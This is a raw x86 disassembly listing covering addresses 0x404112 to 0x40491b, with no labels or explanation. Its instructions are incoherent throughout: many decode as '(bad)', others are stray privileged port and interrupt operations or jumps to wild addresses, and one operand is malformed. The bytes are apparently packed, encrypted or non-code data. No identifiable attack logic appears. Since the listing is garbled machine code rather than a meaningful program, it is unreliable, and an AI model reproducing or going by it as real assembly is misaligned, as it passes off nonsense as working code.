  404112:	sub    eax,DWORD PTR [edx]
  404114:	jmp    0x19ca5046
  404119:	adc    al,0x86
  40411b:	cmp    eax,0xdfa4e8e9
  404120:	shl    cl,cl
  404122:	add    dl,BYTE PTR [edi]
  404124:	dec    ebx
  404125:	xor    al,0x69
  404127:	arpl   WORD PTR [ecx],bx
  404129:	das    
  40412a:	mov    esi,DWORD PTR [esi-0x59f7b2d4]
  404130:	jnp    0x4040d6
  404132:	add    BYTE PTR [eax-0x4aef2c9b],dl
  404138:	mov    bh,BYTE PTR [edi+0x49]
  40413b:	repnz xor BYTE PTR [edi+0x5c947927],al
  404142:	xchg   esi,eax
  404143:	sub    esp,eax
  404145:	out    0x33,al
  404147:	stos   BYTE PTR es:[edi],al
  404148:	sub    ah,0xa3
  40414b:	sbb    DWORD PTR [edi],eax
  40414d:	je     0x404179
  40414f:	inc    DWORD PTR [ecx-0x721a6ad]
  404155:	ja     0x40411f
  404157:	inc    ecx
  404158:	pop    esp
  404159:	inc    esp
  40415a:	mov    bh,0xf5
  40415c:	sub    esi,ecx
  40415e:	mov    ?,WORD PTR [esi]
  404160:	or     eax,0xc0778dad
  404165:	(bad)  [esi-0x6d]
  404168:	push   esp
  404169:	add    al,0x5c
  40416b:	(bad)  
  40416c:	sub    ah,cl
  40416e:	bound  esp,QWORD PTR [ebx-0x19a0061a]
  404174:	ret    0x2f32
  404177:	shl    ecx,1
  404179:	and    BYTE PTR ds:0xb209c7d,cl
  40417f:	aas    
  404180:	jbe    0x40415b
  404182:	push   ds
  404183:	lods   eax,DWORD PTR ds:[esi]
  404184:	repz and eax,0xd81c5db6
  40418a:	sbb    al,0xc
  40418c:	pop    eax
  40418d:	lahf   
  40418e:	jmp    0xe903:0x7ad09f54
  404195:	cmp    edx,esp
  404197:	xchg   ebp,eax
  404198:	aam    0xd4
  40419a:	cmp    eax,0xd522a134
  40419f:	mov    es,WORD PTR [edx+0xf621e5c]
  4041a5:	mov    al,cl
  4041a7:	cmp    cl,ah
  4041a9:	dec    eax
  4041aa:	in     eax,dx
  4041ab:	(bad)  
  4041ad:	push   0x81ff56a6
  4041b2:	mov    esp,edx
  4041b4:	pusha  
  4041b5:	xchg   edi,eax
  4041b6:	sub    BYTE PTR [edi-0x1a],0xaf
  4041ba:	test   eax,ebp
  4041bc:	push   ebx
  4041bd:	push   es
  4041be:	and    ebp,DWORD PTR [esi-0x3e8242e8]
  4041c4:	aaa    
  4041c5:	cmp    DWORD PTR [edi],esi
  4041c7:	fs pop es
  4041c9:	fdiv   DWORD PTR [esi]
  4041cb:	fist   WORD PTR [edi-0x64]
  4041ce:	mov    bl,0xed
  4041d0:	fdiv   DWORD PTR [ecx-0x34376090]
  4041d6:	cdq    
  4041d7:	je     0x4041c8
  4041d9:	sbb    esi,eax
  4041db:	and    BYTE PTR [ebp+0x2a],bl
  4041de:	pop    esp
  4041df:	into   
  4041e0:	out    dx,eax
  4041e1:	nop
  4041e2:	jbe    0x40425a
  4041e4:	imul   ecx,edx,0x44
  4041e7:	lahf   
  4041e8:	mov    ch,0x6a
  4041ea:	mov    edi,0xf3a7f549
  4041ef:	jns    0x4041eb
  4041f1:	push   edx
  4041f2:	adc    al,0x12
  4041f4:	mov    es:0xc1c5cc24,al
  4041fa:	dec    esi
  4041fb:	psubsw mm1,mm4
  4041fe:	test   eax,0xc891b8b8
  404203:	jns    0x40421b
  404205:	enter  0x407b,0x47
  404209:	and    DWORD PTR [edx],esi
  40420b:	mov    ecx,0xda14b77f
  404210:	jecxz  0x40424d
  404212:	jbe    0x4041eb
  404214:	and    DWORD PTR [edx-0x37],esi
  404217:	dec    eax
  404218:	ins    BYTE PTR es:[edi],dx
  404219:	ja     0x4041cf
  40421b:	mov    ch,0x3d
  40421d:	adc    BYTE PTR [ebx],ah
  40421f:	push   eax
  404220:	xchg   esp,eax
  404221:	mov    eax,0x57ef5caa
  404226:	out    0xd6,eax
  404228:	and    eax,0x37b6715b
  40422d:	inc    ebx
  40422e:	imul   esp,DWORD PTR [ecx-0x5a],0xe2cadfd4
  404235:	aaa    
  404236:	xchg   edi,eax
  404237:	aaa    
  404238:	adc    ebx,eax
  40423a:	jns    0x4042b0
  40423c:	xor    al,0x16
  40423e:	fstp   TBYTE PTR fs:[esp+eax*4-0x4e50919a]
  404246:	or     eax,0x9e0c5981
  40424b:	bound  edx,QWORD PTR [esi]
  40424d:	pusha  
  40424e:	daa    
  40424f:	enter  0xd6f4,0xad
  404253:	(bad)  
  404254:	not    BYTE PTR [eax+edx*2]
  404257:	in     eax,dx
  404258:	adc    al,0x86
  40425a:	xor    al,0x1
  40425c:	shl    DWORD PTR [ebx],1
  40425e:	fcomp  DWORD PTR ds:0xc2166223
  404264:	xchg   edi,eax
  404265:	add    eax,0x5931a91f
  40426a:	inc    ecx
  40426b:	mov    eax,0x79820d6d
  404270:	xchg   BYTE PTR [edx-0x7c0f034e],dh
  404276:	js     0x40428a
  404278:	pop    esi
  404279:	inc    ebx
  40427a:	inc    ecx
  40427b:	xchg   ecx,ebx
  40427d:	leave  
  40427e:	frstpm(287 only) 
  404280:	mov    ebx,DWORD PTR [ecx+ebx*8-0xc3d7d6f]
  404287:	mov    BYTE PTR [ecx],ch
  404289:	imul   DWORD PTR [eax]
  40428b:	sub    al,BYTE PTR [esi+0x371de00]
  404291:	and    dh,BYTE PTR [ebp-0x2277a330]
  404297:	stos   BYTE PTR es:[edi],al
  404298:	dec    ebp
  404299:	and    eax,0xc993926f
  40429e:	repz fwait
  4042a0:	dec    edx
  4042a1:	rcl    edx,cl
  4042a3:	outs   dx,DWORD PTR ds:[esi]
  4042a4:	add    ebx,ebp
  4042a6:	push   esp
  4042a7:	fs push es
  4042a9:	cmp    DWORD PTR [ecx+0x4f],esi
  4042ac:	test   bh,0x21
  4042af:	xchg   DWORD PTR [edi+ecx*2],esi
  4042b2:	cmp    BYTE PTR [edi],cl
  4042b4:	test   DWORD PTR [edi],esi
  4042b6:	inc    esi
  4042b7:	(bad)
  4042ba:	sbb    DWORD PTR [esi],edi
  4042bc:	and    eax,0xfe189963
  4042c1:	int    0x3e
  4042c3:	jmp    0x40426a
  4042c5:	aad    0x75
  4042c7:	push   ecx
  4042c8:	fcom   QWORD PTR [edx+edi*8-0xa]
  4042cc:	mov    bl,0x71
  4042ce:	xchg   esp,eax
  4042cf:	or     eax,0xe79616aa
  4042d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042d5:	outs   dx,BYTE PTR ds:[esi]
  4042d6:	fld    DWORD PTR [edi+0x679ace9c]
  4042dc:	inc    ebp
  4042dd:	shl    ebx,cl
  4042df:	cmp    esp,DWORD PTR [ebx]
  4042e1:	daa    
  4042e2:	adc    dl,BYTE PTR [esi-0x2f]
  4042e5:	sub    edx,DWORD PTR [ecx+0x42cb210]
  4042eb:	out    0x3d,eax
  4042ed:	mov    es,WORD PTR [ebx+edi*8]
  4042f0:	jle    0x40434a
  4042f2:	sbb    BYTE PTR [ebx],dh
  4042f4:	fsub   DWORD PTR [ebp-0x2a]
  4042f7:	mov    ch,0x53
  4042f9:	call   0xfa8858e5
  4042fe:	cmp    DWORD PTR [ebx],ebp
  404300:	inc    esi
  404301:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404302:	arpl   WORD PTR [ebx-0x6847bb47],sp
  404308:	lods   al,BYTE PTR ds:[esi]
  404309:	push   es
  40430a:	xor    eax,0xb138ce06
  40430f:	xor    ebx,DWORD PTR [edx-0x737ed1ca]
  404315:	loope  0x4042df
  404317:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404318:	pop    esi
  404319:	mov    ebx,0xb4b7de1b
  40431e:	xlat   BYTE PTR ds:[ebx]
  40431f:	call   0x9b27:0x24521c2a
  404326:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404327:	push   ds
  404328:	jge    0x40430f
  40432a:	mov    esi,0x5a4eb0ba
  40432f:	xchg   ecx,eax
  404330:	nop
  404331:	call   0x3aedf96d
  404336:	cmp    DWORD PTR [esi+ebp*4-0x56],edx
  40433a:	inc    edx
  40433b:	jno    0x404303
  40433d:	dec    edi
  40433e:	das    
  40433f:	div    BYTE PTR [ebx+0x243e4741]
  404345:	dec    ebp
  404346:	adc    esp,DWORD PTR ds:0xe2a23367
  40434c:	es scas al,BYTE PTR es:[edi]
  40434e:	jle    0x404373
  404350:	pop    es
  404351:	push   cs
  404352:	retf   
  404353:	test   DWORD PTR [edi-0x20],ebx
  404356:	sbb    BYTE PTR [edx+0x1d],dh
  404359:	jmp    0x404336
  40435b:	in     eax,0x99
  40435d:	xchg   ebx,eax
  40435e:	lock xchg dl,al
  404361:	jae    0x4043af
  404363:	sub    BYTE PTR [edx-0xdb0655],dl
  404369:	pushf  
  40436a:	repnz not BYTE PTR [esi-0x7b]
  40436e:	inc    ebx
  40436f:	sbb    BYTE PTR [edx-0x6e],ah
  404372:	inc    esi
  404373:	movnti DWORD PTR [ebx-0x54bb1a14],esp
  40437a:	cmp    cl,BYTE PTR [ecx-0x74a881b3]
  404380:	and    BYTE PTR [ecx+0x28f3494c],cl
  404386:	dec    edx
  404387:	or     BYTE PTR [eax+0x14],ch
  40438a:	xchg   BYTE PTR [eax+ecx*8+0xb4faa0f],dh
  404391:	xchg   edi,eax
  404392:	iret   
  404393:	and    ebx,DWORD PTR [esi+0x15a205d8]
  404399:	outs   dx,DWORD PTR ds:[esi]
  40439a:	es adc eax,0x51329c07
  4043a0:	int    0x9a
  4043a2:	pop    ss
  4043a3:	xchg   esp,eax
  4043a4:	pop    esi
  4043a5:	loopne 0x4043a3
  4043a7:	loope  0x40434b
  4043a9:	int    0x3e
  4043ab:	arpl   WORD PTR [edx+edx*2+0x1be6018c],ax
  4043b2:	push   0xfffffff2
  4043b4:	mov    ah,BYTE PTR [ebx-0x5dfa1c53]
  4043ba:	jnp    0x4043e3
  4043bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043bd:	(bad)  
  4043be:	imul   ebx,DWORD PTR [edi+0xfd12a09],0x8157b21
  4043c8:	push   0x8cf6fed1
  4043cd:	retf   
  4043ce:	or     edi,DWORD PTR ds:0xeeb44392
  4043d4:	aad    0xeb
  4043d6:	pop    esp
  4043d7:	popa   
  4043d8:	sub    ah,bl
  4043da:	add    edi,ebp
  4043dc:	and    BYTE PTR [edi+ebx*8+0x672312b3],bl
  4043e3:	sub    eax,0x469ac574
  4043e8:	xor    eax,0xf99c41e
  4043ed:	ins    BYTE PTR es:[edi],dx
  4043ee:	jp     0x4043eb
  4043f0:	repnz sti 
  4043f2:	sub    BYTE PTR [ecx+0x5a3f847c],cl
  4043f8:	int    0x80
  4043fa:	sbb    esi,DWORD PTR [eax+eax*4]
  4043fd:	imul   esp,DWORD PTR [ebx],0xffffffec
  404400:	loopne 0x404443
  404402:	icebp  
  404403:	jb     0x4043a1
  404405:	mov    DWORD PTR [edx+0x9d568b3],ecx
  40440b:	mov    ebp,0xc9080665
  404410:	inc    eax
  404411:	sti    
  404412:	fiadd  DWORD PTR [ebx-0xccd384d]
  404418:	cmc    
  404419:	lock sti 
  40441b:	jmp    0x40443c
  40441d:	pop    edi
  40441e:	cwde   
  40441f:	xlat   BYTE PTR ds:[ebx]
  404420:	es sub ecx,ebx
  404423:	scas   eax,DWORD PTR es:[edi]
  404424:	add    edi,DWORD PTR [eax-0x5a]
  404427:	mov    ss,WORD PTR [ebx+edi*4-0x76]
  40442b:	and    eax,0x8969b61a
  404430:	jmp    0x404440
  404432:	cmc    
  404433:	lea    ecx,[esi+esi*4+0x64]
  404437:	xor    eax,0xd92a07a
  40443c:	mov    eax,ds:0x15f30d0
  404441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404442:	and    esi,0x52
  404445:	mov    eax,ds:0xc5460581
  40444a:	bound  edx,QWORD PTR [edx]
  40444c:	add    ah,ah
  40444e:	repz imul esi,DWORD PTR [eax],0x27
  404452:	jmp    0x404464
  404454:	mov    esi,DWORD PTR [ecx]
  404456:	ret    0x8f68
  404459:	sti    
  40445a:	shr    bh,0xe3
  40445d:	or     DWORD PTR [edi+0x6a],eax
  404460:	popa   
  404461:	mov    ds:0xae292671,al
  404466:	xchg   esi,eax
  404467:	sub    al,0x55
  404469:	ins    BYTE PTR es:[edi],dx
  40446a:	pop    es
  40446b:	data16 or al,0x1f
  40446e:	scas   al,BYTE PTR es:[edi]
  40446f:	push   ebp
  404470:	cmp    DWORD PTR [eax],ecx
  404472:	push   edi
  404473:	or     bh,BYTE PTR [esi-0x7]
  404476:	fisttp DWORD PTR [ebx+0x2e]
  404479:	push   ss
  40447a:	bound  ebx,QWORD PTR [edx+0xcb08c94]
  404480:	ss pop edi
  404482:	dec    ebx
  404483:	add    bl,dh
  404485:	ret    0xc299
  404488:	rcr    BYTE PTR [esi],1
  40448a:	jno    0x4044fb
  40448c:	fcmovnb st,st(5)
  40448e:	mov    al,ds:0x1b87abd5
  404493:	xor    ch,BYTE PTR [ecx+0x3ae7932]
  404499:	(bad)  
  40449a:	pop    ebx
  40449b:	push   ebx
  40449c:	in     al,0xe4
  40449e:	(bad)  
  40449f:	xor    al,0xd5
  4044a1:	mov    dl,0xf0
  4044a3:	outs   dx,DWORD PTR ds:[esi]
  4044a4:	pushf  
  4044a5:	out    dx,eax
  4044a6:	fnstsw WORD PTR [esi-0x5887102c]
  4044ac:	and    eax,0xb0509966
  4044b1:	mov    esp,0xfaa102e4
  4044b6:	add    al,0x3
  4044b8:	jmp    0x75d5d714
  4044bd:	mov    cl,BYTE PTR [esi+0x3e]
  4044c0:	(bad)  
  4044c2:	xor    BYTE PTR [ecx-0x6b8257ab],cl
  4044c8:	daa    
  4044c9:	ret    
  4044ca:	adc    eax,0x826c3155
  4044cf:	xor    al,0x52
  4044d1:	cld    
  4044d2:	xor    eax,0x1726300c
  4044d7:	sub    eax,0xafe589ca
  4044dc:	cli    
  4044dd:	mov    bl,0xfc
  4044df:	and    cl,BYTE PTR [edx-0x53]
  4044e2:	lds    edx,FWORD PTR [esi+0x77]
  4044e5:	int    0xf3
  4044e7:	and    bh,bh
  4044e9:	popf   
  4044ea:	inc    ebx
  4044eb:	adc    dl,al
  4044ed:	and    al,BYTE PTR es:[esi-0x20]
  4044f1:	je     0x404542
  4044f3:	mov    ebx,0x2e41b8e6
  4044f8:	push   ds
  4044f9:	dec    esi
  4044fa:	or     al,0xe8
  4044fc:	adc    al,0xc0
  4044fe:	arpl   WORD PTR [bx+si+0x683e],si
  404503:	daa    
  404504:	xor    ch,BYTE PTR [esi]
  404506:	test   eax,0xdd287de4
  40450b:	icebp  
  40450c:	repz aas 
  40450e:	inc    edx
  40450f:	or     ah,BYTE PTR [esi-0x12]
  404512:	jmp    0xf96ed1e4
  404517:	mov    es,WORD PTR [eax-0xe]
  40451a:	jno    0x404510
  40451c:	and    BYTE PTR [edx-0x20556886],ah
  404522:	cs rol BYTE PTR ds:[eax+0x5a062f65],cl
  40452a:	gs jecxz 0x40456f
  40452d:	inc    ecx
  40452e:	jp     0x404595
  404530:	or     esp,ebx
  404532:	adc    al,BYTE PTR [eax+eax*8]
  404535:	mov    ecx,0x3f6ac9a4
  40453a:	popf   
  40453b:	sti    
  40453c:	cmp    bh,BYTE PTR [edi]
  40453e:	sahf   
  40453f:	adc    eax,0xc9f3e6a4
  404544:	or     DWORD PTR [edi],esp
  404546:	mov    esp,DWORD PTR [esi+0x43b88f9]
  40454c:	mov    eax,0xc5b2d028
  404551:	mov    al,0x79
  404553:	add    DWORD PTR [eax-0x38],eax
  404556:	xchg   esi,eax
  404557:	(bad)  [ebx]
  404559:	call   FWORD PTR [ecx]
  40455b:	stos   BYTE PTR es:[edi],al
  40455c:	shl    BYTE PTR [edi],0x3d
  40455f:	aas    
  404560:	stos   BYTE PTR es:[edi],al
  404561:	xchg   ebp,eax
  404562:	mov    DWORD PTR ds:0xd57c8091,edi
  404568:	out    dx,al
  404569:	lods   eax,DWORD PTR ds:[esi]
  40456a:	sub    eax,0x6ca555d
  40456f:	sahf   
  404570:	mov    ecx,0x4562a10f
  404575:	cmp    al,0x85
  404577:	ss adc eax,0x586be93e
  40457d:	ret    
  40457e:	(bad)  
  40457f:	outs   dx,BYTE PTR ds:[esi]
  404580:	xchg   ebx,eax
  404581:	inc    esp
  404582:	xchg   edx,eax
  404583:	mov    edi,0x2c28a481
  404588:	mov    dh,0x88
  40458a:	add    ah,BYTE PTR [eax]
  40458c:	mov    ecx,0x8f4a267d
  404591:	aad    0x53
  404593:	loope  0x404547
  404595:	pop    ds
  404596:	adc    eax,0x372acb44
  40459b:	enter  0xf6c5,0x1e
  40459f:	or     ecx,ebx
  4045a1:	jmp    0x94845e38
  4045a6:	ds fcmovnu st,st(7)
  4045a9:	xor    bh,BYTE PTR [ebp-0x443578d1]
  4045af:	scas   eax,DWORD PTR es:[edi]
  4045b0:	jmp    0xc439ae56
  4045b5:	test   al,0x6c
  4045b7:	out    0x93,eax
  4045b9:	mov    cl,0x2f
  4045bb:	mov    esi,0x71711d4e
  4045c0:	xor    eax,0x9782d6f1
  4045c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045c6:	call   0x82ccca5f
  4045cb:	push   esi
  4045cc:	in     eax,0x6e
  4045ce:	mov    esp,DWORD PTR [ebp+0x34837425]
  4045d4:	clc    
  4045d5:	push   esi
  4045d6:	iret   
  4045d7:	mov    gs:0xe84cde87,eax
  4045dd:	sub    DWORD PTR [edi+0x47],ecx
  4045e0:	jb     0x404661
  4045e2:	and    eax,0x2ac66f83
  4045e7:	sub    edx,edx
  4045e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045ea:	pushf  
  4045eb:	ror    DWORD PTR [ecx],1
  4045ed:	mov    ch,0x80
  4045ef:	shr    ecx,cl
  4045f1:	xor    al,0xb7
  4045f3:	mov    gs,WORD PTR [edi+0x102e7b88]
  4045f9:	outs   dx,BYTE PTR ds:[esi]
  4045fa:	mov    ebx,0xa2d9272
  4045ff:	mov    al,ds:0x933188d1
  404604:	scas   eax,DWORD PTR es:[edi]
  404605:	pop    es
  404606:	inc    ecx
  404607:	fwait
  404608:	lahf   
  404609:	inc    ebx
  40460a:	fild   WORD PTR [ebp-0x48]
  40460d:	enter  0xf250,0x98
  404611:	xchg   BYTE PTR [ecx],ch
  404613:	rcl    BYTE PTR [edx],cl
  404615:	es sti 
  404617:	aad    0xd2
  404619:	dec    ecx
  40461a:	and    dl,BYTE PTR [esi+0x7383dc14]
  404620:	outs   dx,DWORD PTR ds:[esi]
  404621:	retf   0x8b48
  404624:	stc    
  404625:	xor    DWORD PTR [eax+0x53242221],0x70c8923c
  40462f:	push   0x8565612d
  404634:	mov    ecx,0x743280e0
  404639:	sub    eax,0x3a4ef500
  40463e:	mov    bl,0xf4
  404640:	je     0x404641
  404642:	jl     0x40468f
  404644:	rol    dl,1
  404646:	pop    ecx
  404647:	jo     0x404650
  404649:	and    eax,0xda462d87
  40464e:	sub    eax,0x83045515
  404653:	xor    DWORD PTR [ebx+eiz*1+0x77],0xca8e2709
  40465b:	aam    0x91
  40465d:	push   eax
  40465e:	dec    edi
  40465f:	push   esp
  404660:	and    al,0x42
  404662:	shl    BYTE PTR [esi+ecx*8+0x24f22952],cl
  404669:	test   DWORD PTR ds:0xe5027003,0x4f1f8909
  404673:	mov    cl,0x64
  404675:	xor    DWORD PTR [ebx+0x53c91cfd],edx
  40467b:	push   ss
  40467c:	retf   
  40467d:	outs   dx,BYTE PTR ds:[esi]
  40467e:	push   eax
  40467f:	sbb    al,BYTE PTR [ecx]
  404681:	pop    ebp
  404682:	imul   ebx,DWORD PTR [esp+eax*8+0x73],0x9eb44d7d
  40468a:	dec    edx
  40468b:	adc    eax,0x7abc9a20
  404690:	(bad)  
  404691:	(bad)  
  404692:	sub    ah,BYTE PTR [edx-0x4d]
  404695:	inc    ebp
  404696:	lock inc ebp
  404698:	inc    ecx
  404699:	inc    ebp
  40469a:	inc    ebx
  40469b:	or     esi,DWORD PTR [ecx]
  40469d:	jne    0x4046ce
  40469f:	fistp  WORD PTR [edx-0x1613fef]
  4046a5:	mov    ah,0x38
  4046a7:	mov    bh,BYTE PTR [ecx+0xd]
  4046aa:	lods   al,BYTE PTR ds:[esi]
  4046ab:	pop    es
  4046ac:	push   0xffffffc8
  4046ae:	mov    cl,0x1
  4046b0:	lods   al,BYTE PTR ds:[esi]
  4046b1:	and    al,0xc9
  4046b3:	mov    edi,0x2750c384
  4046b8:	mov    bh,0x71
  4046ba:	aaa    
  4046bb:	aad    0x51
  4046bd:	aad    0xce
  4046bf:	mov    ch,0xc4
  4046c1:	sub    DWORD PTR ds:0xd262e5e5,edi
  4046c7:	retf   0x94d5
  4046ca:	pop    esi
  4046cb:	rcr    DWORD PTR ds:0x497cd8ec,1
  4046d1:	shr    BYTE PTR [edx+eiz*2+0x58],cl
  4046d5:	and    ebp,0x40
  4046d8:	mov    eax,ds:0x596649dd
  4046dd:	xchg   esp,eax
  4046de:	sbb    al,0x55
  4046e0:	cwde   
  4046e1:	loope  0x40473f
  4046e3:	xchg   ebp,eax
  4046e4:	popa   
  4046e5:	xchg   edi,eax
  4046e6:	xor    eax,0x1f634930
  4046eb:	fucom  st(1)
  4046ed:	retf   
  4046ee:	das    
  4046ef:	retf   
  4046f0:	sub    BYTE PTR [esi],dl
  4046f2:	stc    
  4046f3:	jb     0x40471e
  4046f5:	aam    0x1a
  4046f7:	dec    edx
  4046f8:	(bad)  
  4046fa:	adc    al,0x3
  4046fc:	inc    esp
  4046fd:	inc    esi
  4046fe:	pop    esi
  4046ff:	jecxz  0x404738
  404701:	sbb    esp,0xd569cf0d
  404707:	adc    bh,BYTE PTR [edi]
  404709:	popf   
  40470a:	inc    edi
  40470b:	jbe    0x4046d0
  40470d:	pop    ebx
  40470e:	stos   DWORD PTR es:[edi],eax
  40470f:	and    BYTE PTR [edi+0x51],ah
  404712:	xchg   ebp,eax
  404713:	aas    
  404714:	pop    esi
  404715:	or     dl,BYTE PTR [eax-0x18]
  404718:	push   0x8dd914
  40471d:	data16 add BYTE PTR [esi-0x3d],bl
  404721:	ins    DWORD PTR es:[edi],dx
  404722:	out    0xde,al
  404724:	test   al,dl
  404726:	clc    
  404727:	call   0x45d0cde6
  40472c:	shl    DWORD PTR [edi+eiz*4],cl
  40472f:	out    0x7b,al
  404731:	je     0x4047ab
  404733:	and    eax,DWORD PTR [eax]
  404735:	or     DWORD PTR [edi+0x23],esp
  404738:	sub    edx,edx
  40473a:	fsubr  DWORD PTR ds:0xd4075b73
  404740:	arpl   WORD PTR [esi+0xfc220d8],ax
  404746:	and    BYTE PTR [ebx+edx*4],al
  404749:	push   cs
  40474a:	mov    ebp,esp
  40474c:	(bad)  
  40474d:	jp     0x404761
  40474f:	rcr    DWORD PTR [ecx-0x72d84eac],cl
  404755:	jp     0x4047cb
  404757:	or     eax,0x2abcc16
  40475c:	sub    bl,dh
  40475e:	je     0x404737
  404760:	(bad)  
  404761:	test   al,0x66
  404763:	mov    BYTE PTR [eax+0x73],bl
  404766:	jno    0x404781
  404768:	ss fcmove st,st(2)
  40476b:	pop    edi
  40476c:	or     al,0x93
  40476e:	or     ebx,DWORD PTR [edx]
  404770:	inc    ecx
  404771:	gs cmc 
  404773:	aad    0x4b
  404775:	lock retf 0xe475
  404779:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40477a:	mov    cl,0xfd
  40477c:	(bad)  
  40477e:	stos   DWORD PTR es:[edi],eax
  40477f:	nop
  404780:	or     BYTE PTR [esi],dl
  404782:	sbb    eax,0xf6856aa0
  404787:	ins    BYTE PTR es:[edi],dx
  404788:	leave  
  404789:	in     al,0xdc
  40478b:	cli    
  40478c:	sub    eax,0xaa31e324
  404791:	adc    eax,0x5bcb1329
  404796:	xor    eax,0xb58fd4bb
  40479b:	lds    edi,FWORD PTR [ebx+ecx*4-0xafbee0a]
  4047a2:	retf   0xc61d
  4047a5:	sti    
  4047a6:	je     0x404793
  4047a8:	inc    ebp
  4047a9:	lods   eax,DWORD PTR ds:[esi]
  4047aa:	mov    dh,0xf9
  4047ac:	xchg   edx,eax
  4047ad:	cmp    ebx,DWORD PTR [eax+ebx*1]
  4047b0:	icebp  
  4047b1:	cwde   
  4047b2:	shl    DWORD PTR [eax-0x23],0x4e
  4047b6:	fisubr DWORD PTR [edi]
  4047b8:	xchg   esp,eax
  4047b9:	push   esi
  4047ba:	out    0xdd,al
  4047bc:	aam    0xb0
  4047be:	dec    ebp
  4047bf:	and    BYTE PTR [eax],dl
  4047c1:	popf   
  4047c2:	xchg   ebp,eax
  4047c3:	pop    ss
  4047c4:	mov    edx,0xcc2800
  4047c9:	aaa    
  4047ca:	repz or bl,ah
  4047cd:	push   0x7b
  4047cf:	xchg   ecx,eax
  4047d0:	and    ch,BYTE PTR [edx+ecx*4-0x6fff13ac]
  4047d7:	js     0x40484d
  4047d9:	push   cs
  4047da:	jp     0x404785
  4047dc:	xchg   esp,eax
  4047dd:	(bad)
  4047e0:	push   ecx
  4047e1:	jb     0x404774
  4047e3:	(bad)  
  4047e5:	inc    esp
  4047e6:	inc    eax
  4047e7:	stc    
  4047e8:	jno    0x404772
  4047ea:	mov    ds:0x554f99e0,eax
  4047ef:	xchg   BYTE PTR [esi+eiz*2+0x1ffe3652],bh
  4047f6:	aas    
  4047f7:	rcr    BYTE PTR [edx],cl
  4047f9:	dec    esp
  4047fa:	sbb    eax,0x64355c9f
  4047ff:	cmp    esp,esp
  404801:	xlat   BYTE PTR ds:[ebx]
  404802:	into   
  404803:	sbb    al,0x40
  404805:	sbb    DWORD PTR [ebp+edi*8+0x60],edx
  404809:	pop    esp
  40480a:	adc    eax,0xf09341d7
  40480f:	xor    eax,DWORD PTR [edi-0x422ff3b2]
  404815:	push   0x5ca44607
  40481a:	sbb    BYTE PTR [esi-0x43],0x69
  40481e:	scas   al,BYTE PTR es:[edi]
  40481f:	(bad)  
  404820:	cli    
  404821:	rcl    BYTE PTR [ecx],0xf2
  404824:	cs and edi,esp
  404827:	fistp  DWORD PTR [edi-0x32b389b6]
  40482d:	mov    DWORD PTR [edx+0x335e3b6b],ebp
  404833:	pop    ecx
  404834:	jmp    0xbbc52647
  404839:	pop    edi
  40483a:	push   ecx
  40483b:	pop    ebx
  40483c:	or     esi,DWORD PTR [edi-0x54]
  40483f:	bound  esi,QWORD PTR [ebp+eax*1-0x44]
  404843:	das    
  404844:	mov    ds,WORD PTR [edx-0x1804d9f5]
  40484a:	adc    DWORD PTR [edi],0x58aef2fa
  404850:	mov    esp,ecx
  404852:	sbb    eax,0x5dc30e4a
  404857:	cli    
  404858:	push   ds
  404859:	dec    ebx
  40485a:	bound  eax,QWORD PTR [edi+0x15]
  40485d:	mov    dh,0x65
  40485f:	sbb    eax,0xe12eb455
  404864:	mul    BYTE PTR [edx]
  404866:	out    0x57,al
  404868:	(bad)  
  404869:	cwde   
  40486a:	das    
  40486b:	or     BYTE PTR [eax+0x59],0x77
  40486f:	loop   0x404817
  404871:	mov    bh,0x64
  404873:	test   al,0x37
  404875:	pop    ecx
  404876:	xchg   ebp,eax
  404877:	test   eax,edx
  404879:	clc    
  40487a:	retf   0x5d5e
  40487d:	push   ds
  40487e:	(bad)  
  404880:	push   eax
  404881:	popf   
  404882:	sbb    dl,al
  404884:	pushf  
  404885:	inc    ebx
  404886:	ret    
  404887:	xor    al,0x27
  404889:	mov    cl,0x6a
  40488b:	pop    es
  40488c:	inc    ebx
  40488d:	jmp    0xc9d5:0x711bf68f
  404894:	pop    ss
  404895:	jmp    0xc49d85a7
  40489a:	ds ja  0x404827
  40489d:	das    
  40489e:	call   0x331a58b8
  4048a3:	ins    BYTE PTR es:[edi],dx
  4048a4:	ds leave 
  4048a6:	add    edx,DWORD PTR ds:0xe6f6065d
  4048ac:	xchg   edx,eax
  4048ad:	fistp  QWORD PTR [ebp+0x9]
  4048b0:	cmp    BYTE PTR [edx],ch
  4048b2:	adc    eax,0xeae85c9e
  4048b7:	xchg   BYTE PTR [ecx-0x5d],bh
  4048ba:	pop    ebx
  4048bb:	aam    0x5e
  4048bd:	jns    0x40485e
  4048bf:	shl    DWORD PTR [edi+0x6f41125],cl
  4048c5:	jmp    0x4048d0
  4048c7:	mov    edi,0xbcde1fde
  4048cc:	pop    eax
  4048cd:	push   DWORD PTR [ecx]
  4048cf:	or     al,0x1d
  4048d1:	fcmovu st,st(2)
  4048d3:	or     eax,0xe1cb79c6
  4048d8:	mov    esp,0x7df5203b
  4048dd:	arpl   cx,cx
  4048df:	mov    bh,0xb4
  4048e1:	imul   eax,DWORD PTR [edx+edi*8-0x9],0x68
  4048e6:	outs   dx,BYTE PTR ds:[esi]
  4048e7:	jo     0x404927
  4048e9:	pop    ebx
  4048ea:	mov    esp,0xb5aeb1b0
  4048ef:	(bad)  
  4048f0:	sbb    edx,DWORD PTR [eax]
  4048f2:	inc    eax
  4048f3:	das    
  4048f4:	(bad)  
  4048f5:	mov    esp,DWORD PTR [ebx]
  4048f7:	push   esi
  4048f8:	mov    dl,0x18
  4048fa:	aad    0xbb
  4048fc:	push   edx
  4048fd:	adc    BYTE PTR [esi-0x7e94d573],ch
  404903:	(bad)  
  404904:	or     ecx,DWORD PTR [ebx+0x445634f1]
  40490a:	icebp  
  40490b:	jp     0x40490b
  40490d:	js     0x40489c
  40490f:	cmp    esp,DWORD PTR [edx]
  404911:	pop    es
  404912:	(bad)  
  404913:	adc    ah,BYTE PTR [eax+0x72]
  404916:	pop    ecx
  404917:	push   edi
  404918:	cmp    BYTE PTR [eax+0x7f],bh
  40491b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
